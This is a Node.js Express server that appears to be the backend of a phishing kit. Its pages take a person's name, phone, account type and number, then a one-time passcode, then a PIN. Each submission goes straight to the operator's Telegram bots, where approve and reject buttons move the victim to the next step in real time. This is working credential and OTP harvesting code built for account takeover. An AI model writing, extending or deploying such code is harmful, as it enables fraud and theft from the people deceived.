require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------------- MEMORY STORES ----------------
const accountRequests = {};
const otpRequests = {};
const pinRequests = {};
const requestMeta = {};

// ---------------- BOTS ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;

  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];

  if (token && chatId) {
    bots.push({
      botId: `bot${i}`,
      token,
      chatId
    });
  }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- AUTO WEBHOOK SETUP ----------------
async function setWebhook(bot) {
  if (!DOMAIN) {
    console.error(`❌ BACKEND_DOMAIN not set – can't set webhook for ${bot.botId}`);
    return;
  }

  const webhookUrl = `https://${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    const res = await axios.post(
      `https://api.telegram.org/bot${bot.token}/setWebhook`,
      { url: webhookUrl }
    );
    if (res.data.ok) {
      console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl}`);
    } else {
      console.error(`❌ Failed to set webhook for ${bot.botId}:`, res.data.description);
    }
  } catch (err) {
    console.error(`❌ Error setting webhook for ${bot.botId}:`, err.message);
  }
}

// Set webhook for each bot on startup
(async () => {
  for (const bot of bots) {
    await setWebhook(bot);
  }
})();

// ---------------- MIDDLEWARE ----------------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.log("Telegram error:", e.message);
  }
}

async function feedback(bot, meta, message) {
  await sendTelegram(
    bot,
`📢 ACTION UPDATE
👤 ${meta?.name || 'User'}
📞 ${meta?.phone || 'N/A'}

${message}`
  );
}

// ---------------- ENTRY ----------------
app.get('/bot/:botId', (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');

  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ============================================================
//  STEP 1: ACCOUNT DETAILS  (details.html)
// ============================================================
app.post('/submit-account', async (req, res) => {
  const { name, phone, accountType, accountNumber, botId } = req.body;

  const bot = getBot(botId);
  if (!bot) return res.status(400).json({ error: 'Invalid bot' });

  const requestId = uuidv4();
  accountRequests[requestId] = null;
  requestMeta[requestId] = { name, phone, botId };

  // ✅ Telegram message now ONLY shows the 4 fields
  await sendTelegram(
    bot,
`📋 ACCOUNT DETAILS
👤 Name: ${name}
📞 Phone: ${phone}
🏷️ Account Type: ${accountType}
🔢 Account Number: ${accountNumber}
🆔 ${requestId}`,
    [
      [
        { text: '✅ Approve', callback_data: `account_ok:${requestId}` },
        { text: '❌ Reject', callback_data: `account_bad:${requestId}` }
      ]
    ]
  );

  res.json({ requestId });
});

app.get('/check-account/:id', (req, res) => {
  const result = accountRequests[req.params.id];
  if (result === true) return res.json({ redirect: 'code' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ============================================================
//  STEP 2: OTP  (code.html)
// ============================================================
app.post('/submit-otp', async (req, res) => {
  const { name, phone, otp, botId } = req.body;

  const bot = getBot(botId);
  if (!bot) return res.status(400).json({ error: 'Invalid bot' });

  const requestId = uuidv4();
  otpRequests[requestId] = null;
  requestMeta[requestId] = { name, phone, botId };

  await sendTelegram(
    bot,
`🔢 OTP STEP
👤Name: ${name}
📞Phone: ${phone}
🔑OTP: ${otp}
🆔 ${requestId}`,
    [
      [
        { text: '✅ Correct', callback_data: `otp_ok:${requestId}` },
        { text: '❌ Wrong', callback_data: `otp_bad:${requestId}` }
      ]
    ]
  );

  res.json({ requestId });
});

app.get('/check-otp/:id', (req, res) => {
  const result = otpRequests[req.params.id];
  if (result === true) return res.json({ redirect: 'pin' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ============================================================
//  STEP 3: PIN  (pin.html)
// ============================================================
app.post('/submit-pin', async (req, res) => {
  const { name, phone, pin, botId } = req.body;

  const bot = getBot(botId);
  if (!bot) return res.status(400).json({ error: 'Invalid bot' });

  const requestId = uuidv4();
  pinRequests[requestId] = null;
  requestMeta[requestId] = { name, phone, botId };

  await sendTelegram(
    bot,
`🔐 PIN STEP
👤Name: ${name}
📞Phone: ${phone}
🔢PIN: ${pin}
🆔 ${requestId}`,
    [
      [
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
      ]
    ]
  );

  res.json({ requestId });
});

app.get('/check-pin/:id', (req, res) => {
  const result = pinRequests[req.params.id];
  if (result === true) return res.json({ redirect: 'success' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ============================================================
//  TELEGRAM WEBHOOK  (handles all callbacks)
// ============================================================
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, requestId] = cb.data.split(':');
  const meta = requestMeta[requestId];

  let msg = '';

  if (action === 'account_ok') {
    accountRequests[requestId] = true;
    msg = 'Account APPROVED → proceed to OTP';
  }
  if (action === 'account_bad') {
    accountRequests[requestId] = false;
    msg = 'Account REJECTED';
  }

  if (action === 'otp_ok') {
    otpRequests[requestId] = true;
    msg = 'OTP APPROVED → proceed to PIN';
  }
  if (action === 'otp_bad') {
    otpRequests[requestId] = false;
    msg = 'OTP REJECTED';
  }

  if (action === 'pin_ok') {
    pinRequests[requestId] = true;
    msg = 'PIN APPROVED → SUCCESS!';
  }
  if (action === 'pin_bad') {
    pinRequests[requestId] = false;
    msg = 'PIN REJECTED';
  }

  if (meta && msg) {
    await feedback(bot, meta, msg);
  }

  await axios.post(
    `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
    { callback_query_id: cb.id }
  );

  res.sendStatus(200);
});

// ---------------- START ----------------
app.listen(PORT, () => {
  console.log(`🚀 Server running on ${PORT}`);
});